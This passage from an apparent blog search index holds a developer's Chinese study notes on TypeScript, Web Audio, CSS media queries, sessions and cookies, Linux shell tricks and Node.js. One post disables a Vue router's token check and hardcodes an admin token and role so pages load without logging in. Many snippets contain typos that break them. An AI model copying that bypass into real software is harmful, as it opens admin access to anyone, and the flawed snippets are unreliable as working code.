并不会阻止你与其它字符串比较，语言不会把那些表达式识别为类型保护。\n\ninstanceof\n\n自定义类型保护的类型谓词\n\n联合类型2.变量声明let和const是JavaScript里相对较新的变量声明方式。\nlet在很多方面与var是相似的，但是可以帮助大家避免在JavaScript里常见一些问题。 const是对let的一个增强，它能阻止对一个变量再次赋值。\nfor (var i = 0; i &lt; 10; i++) &#123;\n    setTimeout(function() &#123; console.log(i); &#125;, 100 * i);\n&#125;\n\nfor (var i = 0; i &lt; 10; i++) &#123;\n    // capture the current state of 'i'\n    // by invoking a function with its current value\n    (function(i) &#123;\n        setTimeout(function() &#123; console.log(i); &#125;, 100 * i);\n    &#125;)(i);\n&#125;\n//需要复习\n\n\n\nlet vs. const 基本原则就是如果一个变量不需要对它写入，那么其它使用这些代码的人也不能够写入它们，并且要思考为什么会需要对这些变量重新赋值。 使用const也可以让我们更容易的推测数据的流动。\n属性重命名let &#123; a: newName1, b: newName2 &#125; = o;\n\nlet newName1 = o.a;\nlet newName2 = o.b;\n//指示类型\nlet &#123;a, b&#125;: &#123;a: string, b: number&#125; = o;\n\n解构 VS展开    let first=[1,2];\n    let second=[3,4];\n    let both=[0,...first,...second,5];\n\nlet defaults = &#123; food: \"spicy\", price: \"$$\", ambiance: \"noisy\" &#125;;\nlet search = &#123; ...defaults, food: \"rich\" &#125;;\n//search的值为&#123; food: \"rich\", price: \"$$\", ambiance: \"noisy\" &#125;。展开对象后面的属性会覆盖前面的属性。\n//对象展开还有其它一些意想不到的限制。 首先，它仅包含对象 自身的可枚举属性。 大体上是说当你展开一个对象实例时，你会丢失其方法：\nclass C &#123;\n  p = 12;\n  m() &#123;\n  &#125;\n&#125;\nlet c = new C();\nlet clone = &#123; ...c &#125;;\nclone.p; // ok\nclone.m(); // error!\n\n\n\n3.接口TS的核心原则之一就是对值所具有的结构进行类型检查。\n在TS里接口的作用就是为这些类型命名和为你的代码或者第三方代码定义契约。\nfunction prinLabel(labelObj:&#123;label:string&#125;)&#123;\n    console.log(labelObj.label);\n&#125;\n//类型检查器会查看printLabel的调用。 printLabel有一个参数，并要求这个对象参数有一个名为label类型为string的属性。\n//下面是接口描述\ninterface LabelValue&#123;\n    label:string;\n&#125;\n\nfunction printLabel(labelObj:LabelValue)&#123;\n    console.log(labelObj.label);\n&#125;\nlet myObj = &#123;size: 10, label: \"Size 10 Object\"&#125;;\nprintLabel(myObj);\n//只要传入的对象满足上面提到的必要条件，那么它就是被允许的。类型检查器不会去检查属性的顺序，只要相应的属性存在并且类型也是对的就可以。\n\n\n\n\n\n\n\n接口里的属性不全都是必需的。有些是只在某些条件下存在，或者根本不存在。 可选属性在应用“option bags”模式时很常用，即给函数传入的参数对象中只有部分属性赋值了。\ninterface SquareConfig&#123;\n    //带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个?符号。\n    color?:string;\n    width?:number;\n&#125;\n\n\nfunction createSquare(config:SquareConfig):&#123;color:string; area:number&#125;&#123;\n    let newSquare=&#123;color:\"white\",area:100&#125;;\n    if(config.color)&#123;\n        newSquare.color=config.color;\n    &#125;\n    if(config.width)&#123;\n        newSquare.area=config.width*config.width;\n    &#125;\n    return newSquare;\n&#125;\n\nlet mySquare=createSquare(&#123;color:\"black\"&#125;);\n\n可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。\n可选属性interface SquareConfig&#123;\n    reaoly color?:string;\n    width?:number;\n&#125;\n    \nlet a: number[] = [1, 2, 3, 4];\nlet ro: ReadonlyArray&lt;number> = a;  //只读数组\n\nfunction CreateSquare(config:SquareConfig):&#123;color:string;area:number&#125;&#123;\n    let newSquare=&#123;color:\"white\",area:100&#125;;\n    if(config.color)&#123;\n        newSquare.color=config.color;\n    &#125;\n    if(config.width)&#123;\n        newSquare.area=config.width*config.width;\n    &#125;\n    return newSquare;\n&#125;\n\nlet mySquare=createSquare(&#123;color:\"blcak\"&#125;);\n//TypeScript会认为这段代码可能存在bug。 对象字面量会被特殊对待而且会经过额外属性检查，当将它们赋值给变量或作为参数传递的时候。 如果一个对象字面量存在任何“目标类型”不包含的属性时，你会得到一个错误。\n// error: 'colour' not expected in type 'SquareConfig'\nlet mySquare = createSquare(&#123; colour: \"red\", width: 100 &#125;);\n\n最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。 做为变量使用的话用const，若做为属性则使用readonly。\n额外的属性检查绕开检查非常简单，常用的使用断言：\nlet mySquare=createSquare(&#123;width:100,opacity:0.5&#125; as SquareConfig);\n\n最佳方式是添加一个字符串索引签名，前提是能够确定这个对象可能具有某些作为特殊用途使用的额外属性。\ninterface SquareCOnfig&#123;\n    color?:string;\n    width?:number;\n    [propName:string] :any;\n&#125;\n\n后一种跳过这些检查的方式，这可能会让你感到惊讶，它就是将这个对象赋值给一个另一个变量： 因为squareOptions不会经过额外属性检查，所以编译器不会报错。\nlet squareOptions = &#123; colour: \"red\", width: 100 &#125;;\nlet mySquare = createSquare(squareOptions);\n\n函数类型除了描述带有属性的普通对象外，接口也可以描述函数类型。\ninterface SearchFunc&#123;\n    (source:string,subStrimg:string):boolean;\n&#125;\n\n//下例展示了如何创建一个函数类型的变量，并将一个同类型的函数赋值给这个变量。\nlet mySearch:SearchFunc;\nmySearch=function(source:string,subString:string)&#123;\n    let result=source.search(subString);\n    return result >-1;\n&#125;\n//函数的参数名不需要与接口里定义的名字相匹配。\nmySearch = function(src: string, sub: string): boolean &#123;\n  let result = src.search(sub);\n  return result > -1;\n&#125;\n//函数的参数会逐个进行检查，要求对应位置上的参数类型是兼容的。 \n\n4.类类的实例class Greeter&#123;\n    greeting:string;\n    constructor(message:string)&#123;\n        this.,greeting=message;\n    &#125;\n    greet()&#123;\n        return \"Hello\"+this.greeting;\n    &#125;\n&#125;\n\nlet greeter=new Greeter(\"World\");\n\n继承class Animal&#123;\n    move(distanceInMeters:number=0)&#123;\n        console.log(`Animal moved $&#123;distanceInMeters&#125; m.`);\n    &#125;\n&#125;\n\nclass Dog extends Adnimal&#123;\n    bark()&#123;\n        console.log('Woof!Woof!');\n    &#125;\n&#125;\n\nconst dog=new Dog();\ndog.bark();\ndog.move(10);\n\n\n一个更加复杂的例子\nclass Animal&#123;\n    name:string;\n    constructor(theName:string)&#123;\n        this.name=theName;\n    &#125;\n    \n    move(distance:number=0)&#123;\n        consloe.log(`$&#123;name&#125; moved $&#123;distance&#125; m.`);\n    &#125;\n&#125;\n\nclass Snake extends Adnimal&#123;    \n    constructor(name:string)&#123; \n        super(name);               //派生类包含了一个构造函数，它必须调用super()，它会执行基类的构造函数。 \n    &#125;             //在构造函数里访问this的属性之前，一定要调用super()。 TypeScript强制执行的一条重要规则。\n    \n    move(distance:number=5)&#123;\n        consloe.log(\"Slithering...\");\n        super.move(distance);               //调用父类方法\n    &#125;\n&#125;\n\nclass Horse extends Adnimal&#123;\n    constructor(name:string)&#123;\n        super(name);\n    &#125;\n    \n    move(distance=45)&#123;\n        console.log(\"Galloping...\");\n        super.move(distance);\n    &#125;\n&#125;\n\nlet sam=new Snake(\"Sammy the Python\");\nley tom:Animal=new Horse(\"Tommy the palomino.\");\n\nsam.move();\ntom.move(34);\n\n//Slithering...\n//Sammy the Python moved 5m.\n//Galloping...\n//Tommy the Palomino moved 34m.\n\n\n公有、私有、受保护的修饰符TS中，所有的成员都默认为Public；\nclass Animal&#123;\n    public name:string;\n    public constructor(theName:string)&#123;\n        this.name=theName;\n    &#125;\n    public move(distance:number)&#123;\n        console.log('move~');\n    &#125;\n&#125;\n\n\n\nprivate 不能在声明它的类的外部访问。\nTS使用的是结构类型系统。如果所有成员的类型都是兼容的，就认为是类相兼容的。\nprotected 和private 相似，但是它的成员可以在派生类访问。\nclass Person&#123;\n    protected name:string;\n    constructor(name:string)&#123;\n        this.name=name;\n    &#125;\n&#125;\n\nclass Employee extends Person&#123;\n    private department:string;\n    \n    constructor(name:string,department:string)&#123;\n        super(name);\n        this.department=department;\n    &#125;\n    \n    //派生类访问\n    public getPitch()&#123;\n        return `Hello, my name is $&#123;this.name&#125; and i work in $&#123;this.defartment&#125;.`;\n    &#125;\n&#125;\n\nlet howard=new Employee(\"Howard\",\"Sales\");\nconsole.log(howard.getPitch());\nconsole.log(howard.name);   //error;\n\nreadonly你可以使用readonly关键字将属性设置为只读的。 只读属性必须在  声明时或  构造函数里被初始化。\n存取器TS支持通过getters/setters来截取对对象成员的访问。\nlet password=\"password\";\n\nclass Employee&#123;\n    private _fullname:string;\n    \n    get fullName():string&#123;\n        return this._fullname;\n    &#125;\n    \n    set fullName(name:string)&#123;\n        if(password &amp;&amp; password=='password')&#123;\n            this._fullName=name;\n        &#125;else\n            &#123;\n                consloe.log(\"You have not permissiond.\");\n            &#125;\n    &#125;\n&#125;\n\nstatic静态属性静态成员的属性只存在于类本身上而不是类的实例上。\nclass Grid&#123;\n    static origin=&#123;x:0,y:0&#125;;\n    calDisFromOriginPoint(point:&#123;x:number; y:number;&#125;)&#123;\n        let xDist=(point.x-Grid.origin.x);\n        let yDist=(point.y-Grid.origin.y);\n        return Math.sqrt(xDist*xDist+yDist*yDist)/this.scale;\n    &#125;\n    \n    construtor(public scale:number)&#123;&#125;\n&#125;\n\nlet grid1=new Grid(1.0);\nlet grid2=new Grid(5.0);\n\n抽象类abstract class Animal&#123;\n    abstract makeSound():void;\n    move():void&#123;\n        console.log(`roaming the earch...`);\n    &#125;\n&#125;\n\nhttps://typescript.bootcss.com/classes.html\n抽象类作为其他派生类的基类使用。一般不会直接实例化。\n不同于接口。抽象类可以包含成员的实现细节；\n抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。抽象方法的语法与接口方法类似。\n两者都是定义方法签名但是不包含方法体；\n抽象方法必须包含abstract关键字并且可以包含访问修饰符。\nabstract class Department&#123;\n    constructor(public name:string)&#123;\n        \n    &#125;\n    \n    printName():void&#123;\n        console.log('Deartment name:' +this.name);\n    &#125;\n    \n    abstract printMeeting();void;\n&#125;\n\nclass AccountingDepartment extends Department&#123;\n    \n    constructor()&#123;\n        super(\"Accounting and auditing\");\n        //派生类构造函数必须吊桶super（）；\n    &#125;\n    \n    //父类的抽象类在子类必须实现；\n    printMeeting():void&#123;\n        console.log(\"The account ing meets each monday.\");\n    &#125;\n    \n    generateReports():void&#123;\n        \n    &#125;\n&#125;\n\n\n\n\n把类当接口使用class Poing&#123;\n    x:number;\n    y:number;\n&#125;\n\ninterface Point3D extends Point&#123;\n    z:number;\n&#125;\n\nlet point3d:Point3D=&#123;\n    x:1,\n    y:2,\n    z:3,\n&#125;\n\n5.函数完整函数类型let myAdd:(x:number,y:number)=>number=function(\nx:number,y:number\n):number&#123;\nreturn x+y;\n&#125;\n\n只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确。\n可选参数必须跟在必须参数后面。 \n与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入undefined值来获得默认值。 例如，我们重写最后一个例子，让firstName是带默认值的参数：\n剩余参数在JavaScript里，你可以使用arguments来访问所有传入的参数。\n在TypeScript里，你可以把所有参数收集到一个变量里：\nfunction buildName(firstName: string, ...restOfName: string[]) &#123;\n  return firstName + \" \" + restOfName.join(\" \");\n&#125;\n\nlet employeeName = buildName(\"Joseph\", \"Samuel\", \"Lucas\", \"MacKinzie\");\n\nthis","slug":"TS基础","date":"2023-06-26T13:33:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,TS","author_index":"Martin"},{"id":"b9697662cdffe977cb41ca0017dc8bf9","title":"Web Audio API","content":"Web Audio API\n实现功能可视化、音色合成器、动态混音、声音特效、3D空间音频、均衡器、环境混响\n一、基础使用1.AudioContext为音频处理提供一个上下文环境，相当于一个中央控制器，控制音频路由的各个模块；\n1.1音频结点AudioNode音频路由中的基本单位，工作依赖于AudioContext，音频结点拥有自己的输入输出，通过connect方法将一个节点的输出连接到另一个结点的输入。\naudioBufferSourceNode.connect(audioContext.destination)\n\n\nSouce Node:能产生音频的结点，只有输出没有输入\nProcess Node:能对音频进行处理的结点，有多个输入和输出\nDestination Node:通常为音频播放设备\n\n\n有的音频处理节点会有多个输出，比如ChannelSplitterNode，可以将音频拆分为多个声道，对应的，也有一个合并声道的节点ChannelMergerNode，有多个输入和一个输出。\n1.2 路由图","slug":"Web Audio","date":"2023-06-26T13:13:45.000Z","categories_index":"前端","tags_index":"笔记,JS,TS","author_index":"Martin"},{"id":"b9b4fcd437d7750f62f23ae4d11d445c","title":"Vue登录页面跳过","content":"Vue 登录页面跳过1.业务需求\n后端暂时无法提供接口\n需要查看前端页面效果\n\n2.方法/*\n * @Author: Aruver\n * @Date: 2022-10-08 09:45:03\n * @LastEditors: Aruver\n * @qq: 37919926\n */\nimport router from './router'\nimport store from './store'\nimport &#123; Message &#125; from 'element-ui'\nimport NProgress from 'nprogress' // progress bar\nimport 'nprogress/nprogress.css' // progress bar style\nimport &#123; getToken &#125; from '@/utils/auth' // get token from cookie\nimport getPageTitle from '@/utils/get-page-title'\n\nNProgress.configure(&#123; showSpinner: false &#125;) // NProgress Configuration\n\nconst whiteList = ['/login'] // no redirect whitelist\n\nrouter.beforeEach(async (to, from, next) => &#123;\n  // start progress bar\n  NProgress.start()\n\n  // set page title\n  document.title = getPageTitle(to.meta.title)\n\n  // determine whether the user has logged in\n  // const hasToken = getToken()\n\n  // if (hasToken) &#123;\n  //   if (to.path === '/login') &#123;\n  //     // if is logged in, redirect to the home page\n  //     next(&#123; path: '/' &#125;)\n  //     NProgress.done()\n  //   &#125; else &#123;\n  //     const hasGetUserInfo = store.getters.name\n  //     if (hasGetUserInfo) &#123;\n  //       next()\n  //     &#125; else &#123;\n  //       try &#123;\n  //         // get user info\n  //         // await store.dispatch('user/getInfo')\n\n  //         next()\n  //       &#125; catch (error) &#123;\n  //         // remove token and go to login page to re-login\n  //         await store.dispatch('user/resetToken')\n  //         Message.error(error || 'Has Error')\n  //         next(`/login?redirect=$&#123;to.path&#125;`)\n  //         NProgress.done()\n  //       &#125;\n  //     &#125;\n  //   &#125;\n  // &#125; else &#123;\n  //   /* has no token*/\n\n  //   if (whiteList.indexOf(to.path) !== -1) &#123;\n  //     // in the free login whitelist, go directly\n  //     next()\n  //   &#125; else &#123;\n  //     // other pages that do not have permission to access are redirected to the login page.\n  //     next(`/login?redirect=$&#123;to.path&#125;`)\n  //     NProgress.done()\n  //   &#125;\n  // &#125;\n\n  //跳过登录，设置默认的token，然后输入其中一个路由进入页面\n  const hasToken = 'admin-token'\n  const role = 'admin'\n  if (hasToken) &#123;\n    next()\n    const accessRoutes = await store.dispatch('permission/generateRoutes', role)\n    // dynamically add accessible routes\n    router.addRoutes(accessRoutes)\n  &#125;\n&#125;)\n\nrouter.afterEach(() => &#123;\n  // finish progress bar\n  NProgress.done()\n&#125;)\n","slug":"Vue-Admin-Template跳过登陆页面","date":"2023-06-25T13:33:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,项目问题","author_index":"Martin"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"css实现响应式布局1.响应式布局\n响应式布局指同一页面在不同屏幕尺寸下有不同的布局；\n传统方式是PC端开发一套，手机端开发一套；\n使用响应式布局只需要开发一套就够了；\n\n\n检测视口分辨率，针对不同客户端来做代码处理，展现不同的布局和内容；\ncss3媒体查询可以让我们针对不同的媒体类型定义不同的样式；\n重置浏览器窗口大小的过程，页面也会更具浏览器的宽度和高度重新渲染页面；\n\n2.响应式实现方式\n媒体查询\n流体布局\n弹性布局\nJS、Jquery来进行判断；\nBootstrap第三方框架；\n\n3.媒体查询\nCSS3新语法；\n使用@media查询可以针对不同的媒体类型定义不同的样式；\n@media可以针对不同的屏幕尺寸设置不同的样式；\n@media才能够实现页面响应式布局；\n\n@media[not|only] type [and][expr] (media feture)&#123;\n    rules;\n&#125;\n\n参数说明：\ntype媒体类型：all、screen；\nmedia feature :witdth (浏览器窗口尺寸，可加min\\max) device-width (设备的参数尺寸，可加min、max)；\nmin-width:最小宽度，在媒体查询中，宽度大于或者等于最小宽度是，触发其css样式；\nmax-width:最大宽度，在媒体查询中，宽度小于或等于最大宽度，触发；\n\n注：1.一般都是先实现PC端页面，然后再去做其他设备的兼容（把媒体查询写在默认样式之后）2.设置宽度时，最好不要写死(px)，而是用%单位参照父元素的大小\n4. 媒体查询方式\n直接在css文件使用\n\n@media type and (A) and (b) &#123;\n    \trules;\n&#125;\n\n\n使用import导入\n\n/*设备宽度小于980px*/\n@import url('css/media.css') all and (max-width:980px);\n\n\n使用link链接\n\n&lt;link rel=\"stylesheet\" href=\"css/media.css\" media=\"all and (max-width:980px)\">\n\n注：媒体查询的优先级与普通 CSS 完全相同，因此当使用媒体查询时，一定要将媒体查询的样式放在默认样式之后，否则媒体查询会被默认样式覆盖，也就无法针对不同设备进行变化;\n5.补充知识：像素单位\npx 像素相对长度，相对于屏幕分辨率而言；\nem 如果自身有font-size，em相对于自己的font-size，如果没有，则相对于父元素的font-size，任何浏览器的默认字体大小都是16px，所以1em=16px;\n% 相对于父元素的宽度大小；\nrem 相对于根元素（html)的字体大小);\nvw 视口的最大宽度， 1vw=视口宽度的百分之一；\nvh 视口的最大高度， 1vh=视口高度的百分之一；\n\n","slug":"CSS实现响应式布局","date":"2023-04-06T12:51:38.239Z","categories_index":"","tags_index":"","author_index":"Martin"},{"id":"26bc2020d08ea791ee82a8707889b8be","title":"Session And Cookie","content":"Session And Cookie一、Session和Cookie简介1.简介\nCookie的出现是因为http是无状态协议，服务器记不住访问者，刷新一次页面可能就需要输入账号密码重新登录；\ncookie作用就是让服务器认识你；\n\n\ncookie可以认为是一个变量，形如name=value,存储在浏览器；\n一个session可以理解为一个数据结构，多数情况是映射，存储在服务器上；\n\n\ncookie可以在服务器通过http的SetCookie字段设置Cookie；\n\nfunc cookie(w http.ResponseWriter, r *http.Request)&#123;\n    http.SetCookie(w,&amp;http.Cookie)&#123;\n        Name:'Martin',\n        Value:'128'\n    &#125;\n    \n      http.SetCookie(w,&amp;http.Cookie)&#123;\n        Name:'Jacy',\n        Value:'129'\n    &#125;\n&#125;\n\n\n当浏览器访问对应网址时，通过浏览器的开发者工具查看此次HTTP通信的喜姐，可以看见服务器的回应发出来两次SetCookie命令；\n此后，浏览器请求中的Cookie都会带上这两个字段；\n\n2. cookie的问题cookie字段存储在HTTP Header中，如果cookie的信息越来越多，会消耗更多的带宽；\n3. session + cookie\n一个cookie存储一个变量 sessionID=’123456’;\n仅仅将一个cookie传递给服务器，服务器通过ID查询对应的session，这个session是一个数据结构，存储了各种用户的信息，有效解决了追踪用户的问题。\nsession是一个数据结构，由网站的开发者设计，可以承载各种数据；\n由于存储在服务器，所以session会有过期时间，一般是定期删除过期的session；\n\n二、Session的实现1.实现\nManager\nProvider\nSession\n\n\n\n浏览器通过HTTP协议向服务器请求资源，对应路径上有个Handler函数接受请求，解析HTTPheader中的cookie，得到SessionID，发送给Manager；\nManager充当session管理器的角色，主要存储一些配置信息，比如session存活时间，cookie的名字等；所有的session存在Manager内部的Provider中，Manager会把sessionID传递给Provider；\nProvider是一个容器，散列表，将sessionID和session一一对应，收到Manager的sid后，查询session并返回；\nHandler根据session中的信息，进行处理，返回对应的HTML信息；\n\n2.为什么要划分Manager、Provider、Session\nsession结构可能不止一个哈希表，还存储辅助数据等；\nsession可能有不同的存储方式：比如村粗缓存数据库redis或者存入Mysql；因此session结构提供一层抽象，屏蔽不同存储方式的差异；\nProvider内部会很复杂，需要适应不同的算法比如LRU缓存淘汰算法，来存储session；\n Manager 主要就是⼀个参数集合，⽐如 session 的存活时间，清理过期 session 的策略，以及 session 的可⽤存储⽅式。 Manager 屏蔽了操作的具体 细节，我们可以通过 Manager 灵活地配置 session 机制。\n\n","slug":"Session And Cookie","date":"2023-04-06T11:51:45.000Z","categories_index":"前端","tags_index":"session,cookie","author_index":"Martin"},{"id":"e9cc1e6aaaea90ce1263cf8fa336b7a8","title":"Linux Shell","content":"Linux Shell\n标准输入和命令参数的区别；\n后台运行命令在推出中断后也全部退出；\n单引号和双引号表示字符串的区别；\n有的命令和sudo一起用就会Command not found;\n\n一、标准输入和参数的区别1.标准输入和参数#错误\nwhere connect.sh | rm\n\n#正确\nrm $(where connect.sh)\n\n\n\n标准输入就是编程语言中诸如scanf或者readline命令，而参数是指程序的main函数传入的args字符数组；\n如果命令能够让终端阻塞，说明该命令接受标准输入，反之不接受；\n\n2.后台运行程序python manager.py run server 0.0.0.0\n\n远程登录服务器然后启动Django服务，此时可以通过服务器IP测试，但是终端此时是阻塞状态；\n可以在命令后加上&amp;符号，命令行就不会阻塞，响应后续命令；\n(python manager.py runserver 0.0.0.0  &amp;)\n\n\n每一个终端其实都是一个shell进程，在该终端执行的程序其实都是这个shell进程分出来的子进程；\n正常情况下，shell进程会阻塞，等待子进程退出才重新接受新的命令；\n加上&amp;符号只是让shell进程不在阻塞可以继续响应命令，但是无论如何，一旦终端关闭，所有依附的子进程都会关闭；\n而（cmd &amp;）这样运行命令，则是将cmd命令挂到systemed系统守护进程；\n\nnohub some_cmd &amp;\n\n3.单双引号的区别\n不同的shell会有细微区别；\n对于$,(),这几个符号，单引号包围的字符串不会做任何转义，双引号会；\n\n\n如果$读出的参数字符包含空格，应该用双引号括起来，否则会出错；\n\n4. sudo找不到命令有时普通用户可以用的命令，加上sudo权限却无法使用；\n\n原因在于该脚本仅存在于该用户的环境变量中；\n解决方法是使用脚本文件的路径；\n\n二、Linux Shell提高效率的技巧1.相似文件名# onefile twofile threefile\necho &#123;one,two,three&#125;file\n\n#one1 one2 one3 two1 two2 two3 three1 three2 three3\necho &#123;one,two,three&#125;&#123;1,2,3&#125;\n\n应用：命令拓展参数\n#给file复制一个file.bak的副本\ncp /path/file&#123;,.bak&#125; \n\n#删除file&#123;1，3，5&#125;\nrm file&#123;1,3,4&#125;.txt\n\n#移动相同类型文件\nmv *.&#123;c,cpp&#125; src/\n\n2. 输入路径名称太麻烦#返回home\ncd  \n\n#返回上一个目录\ncd -\n\n# !$会替换上一次命令最后的路径\nchmod +x !$\n\n# !*会替换上一次命令输入的所有文件路径\nchmod +x !*\n\n# !! 自动使用上一个命令；\n！！\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Linux Shell","date":"2023-04-06T10:51:45.000Z","categories_index":"Linux","tags_index":"shell,Linux","author_index":"Martin"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"Node JS From W3C一、NodeJS回调函数\n异步编程依托于回调来实现；\n回调函数完成任务后会被调用，Node使用了大量得回调函数，Node所有Api都支持回调函数；\n例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。\n\nfunction foo1(name,age,callback)&#123;&#125;\nfunction foo2(value,callback1,callback2)&#123;&#125;\n\n//阻塞代码实例\nvar fs=require(\"fs\");\nvar data=fs.readFileSync('../../assets/test.txt');\nconsole.log(data.toString());\nconsole.log(\"Program Ended\");\n\n\n//非阻塞代码实例\nvar fs=require(\"fs\");\nfs.readFile('../../assets/test.txt',function(err,data)&#123;\n    if(err) return console.error(err);\n    console.log(data.toString());\n&#125;);\nconsole.log(\"Program Ended\");\n\n第一个实例在文件读取完之后才执行；第二个实例我们不需要等待文件读取完；可以在读取文件的同时处理其他逻辑；\n二、NodeJS事件循环1.events\nNodeJS是单进程单线程应用程序，但是因为V8引擎提供得异步执行回调接口，通过这些接口可以处理大量并发，性能较高；\nNode.js 基本上所有的事件机制都是用设计模式中观察者模式实现。\nNode.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数.\nNode.js使用事件驱动模型，当web server接收到请求，就把它关闭进行处理，然后服务下一个web请求；\n请求完成，放回处理队列，当到达队列开头，将结果返回给用户；\nwebserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO）\n\n//引入events模块；\nvar events=require('events');\n//创建eventEmitter对象\nvar eventEmitter=new events.EventEmitter();\n\n//绑定事件及事件得处理程序\neventEmitter.on('eventName',eventHandler);\n\n//触发事件\neventEmitter.emit('eventName');\n\n//引入events模块\nvar events=require('events');\n//创建eventEmitter对象\nvar eventEmitter=new events.EventEmitter();\n//创建事件处理程序\nvar connectHandler=function connected()&#123;\n    console.log('连接成功。');\n    //触发data_received事件\n    eventEmitter.emit('data_received');\n&#125;\n//绑定connection事件处理程序\neventEmitter.on('connection',connectHandler);\n//使用匿名函数绑定data_received事件\neventEmitter.on('data_received',function()&#123;\n    console.log('数据接收成功。');\n&#125;);\n//触发connection事件\neventEmitter.emit('connection');\nconsole.log(\"程序执行完毕。\");\n\n2.Node是如何工作的？\nNode应用程序中，执行异步操作得函数将回调函数作为最后一个参数，回调函数接受错误对象作为第一个参数；\n\n\nvar fs=require(\"fs\");\n//将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。\nfs.readFile('../../assets/test.txt',function(err,data)&#123;\n    if(err) return console.error(err);\n    console.log(data.toString());\n&#125;);\nconsole.log(\"程序执行完毕\");\n\n3.EventEmitter\nNode.js得所有异步I/O操作都会在完成时返回一个事件到事件队列；\nNode.js里面得许多对象都会分发事件，所有这些事件得对象都是events.EventEmitter的实例；\n\nEventEmitter类：事件触发与事件监听器功能的封装var EventEmitter=require('events').EventEmitter;\nvar event=new EventEmitter();\nevent.on('some_event',function()&#123;\n    console.log('some_event 事件触发');\n&#125;);\nevent.on('some_event',function()&#123;\n    console.log(\"Martin wang 的事件触发了\");\n&#125;);\nsetTimeout(function()&#123;\n    event.emit('some_event');\n&#125;,1000);\n\n原理：event对象注册了事件some_event的一个监听器，然后1000ms后向event对象发送事件some_event此时调用其监听器；\nEventEmitter的每个事件由一个事件名和若干参数组成，事件名是一个字符串；每个事件支持若干个事件监听器；\n两个事件监听器回调函数被先后调用；\nvar events=require('events');\nvar emitter=new events.EventEmitter();\n\n//监听器1\nvar listener1=function listener1()&#123;\n    console.log('监听器listener1执行');\n&#125;   \n//监听器2\nvar listener2=function listener2()&#123;\n    console.log('监听器listener2执行');\n&#125;\n//绑定connection事件，处理函数为listener1   \nemitter.addListener('connection',listener1);\n//绑定connection事件，处理函数为listener2\nemitter.on('connection',listener2);\nvar eventListeners=require('events').EventEmitter.listenerCount(emitter,'connection');\nconsole.log(eventListeners+\"个监听器监听连接事件。\");\n//处理connection事件\nemitter.emit('connection');\n//移除绑定的listener1函数   \nemitter.removeListener('connection',listener1);\nconsole.log(\"listener1不再受监听。\");\n//触发连接事件\nemitter.emit('connection');\neventListeners=require('events').EventEmitter.listenerCount(emitter,'connection');\nconsole.log(eventListeners+\"个监听器监听连接事件。\");\nconsole.log(\"程序执行完毕。\");\n\n4.继承EventEmitter\n大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。\n为什么要这样做呢？原因有两点：\n首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。\n其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。\n\n三、NodeJS Buffer\nJS语言自身只有字符串数据类型，没有二进制数据类型；\n但是处理TCP流或者文件流时，必须使用二进制数据；因此NodeJS定义了一个Buffer类，创建一个专门存放二进制数据的缓存区；\n\n1.Buffer与字符编码\nBuffer实例一般用于表示编码字符的序列，比如UTF-8等；\n\nconst buf=Buffer.from('hello world','ascii');\nconsole.log(buf.toString('hex'));\nconsole.log(buf.toString('base64'));\n\n2.Buffer类//创建长度为10字节的Buffer实例\nconst buf1=Buffer.alloc(10);\n//创建长度为10字节，且用0填充的Buffer实例\nconst buf2=Buffer.alloc(10,1);\n//创建长度为10字节，且未初始化的Buffer实例\nconst buf3=Buffer.allocUnsafe(10);\n//创建一个包含[0x1,0x2,0x3]的Buffer实例\nconst buf4=Buffer.from([1,2,3]);\n//创建一个包含UTF-8字节[0x74,0x65,0x73,0x74]的Buffer实例\nconst buf5=Buffer.from('test');\n//创建一个包含Latin-1字节[0x74,0x65,0x73,0x74]的Buffer实例\nconst buf6=Buffer.from('test','latin1');\n\n\n3.写入缓冲区buf.write(string[,offset[,length]][,encoding])\n// string 字符串\n// offset 开始写入的索引值\n// length 写入的字节数\n// encoding 编码方式\nbuf.write('hello world');\nconsole.log(buf.toString());\nconsole.log(buf.toJSON());\nconsole.log(buf.toString('base64'));\n//缓冲区合并\nconst buffer1=Buffer.from(('菜鸟教程'));\nconst buffer2=Buffer.from(('www.runoob.com'));\nconst buffer3=Buffer.concat([buffer1,buffer2]);\nconsole.log(\"buffer3 内容: \"+buffer3.toString());\n//缓冲区比较\nconst buffer4=Buffer.from('ABC');\nconst buffer5=Buffer.from('ABCD');\nconst result=buffer4.compare(buffer5);\nif(result&lt;0)&#123;\n    console.log(buffer4+\"在\"+buffer5+\"之前\");\n&#125;else if(result==0)&#123;\n    console.log(buffer4+\"与\"+buffer5+\"相同\");\n&#125;else&#123;\n    console.log(buffer4+\"在\"+buffer5+\"之后\");\n&#125;\n//拷贝缓冲区\nconst buffer6=Buffer.from('ABC');\n//拷贝一个缓冲区\nconst buffer7=Buffer.alloc(3);\nbuffer6.copy(buffer7);\nconsole.log(\"buffer7 content: \"+buffer7.toString());\n//缓冲区裁剪\nconst buffer8=Buffer.from('runoob');\n//剪切缓冲区\nconst buffer9=buffer8.slice(0,2);\nconsole.log(\"buffer9 content: \"+buffer9.toString());\n\n方法名参考JS的字符串处理；\n四、NodeJS 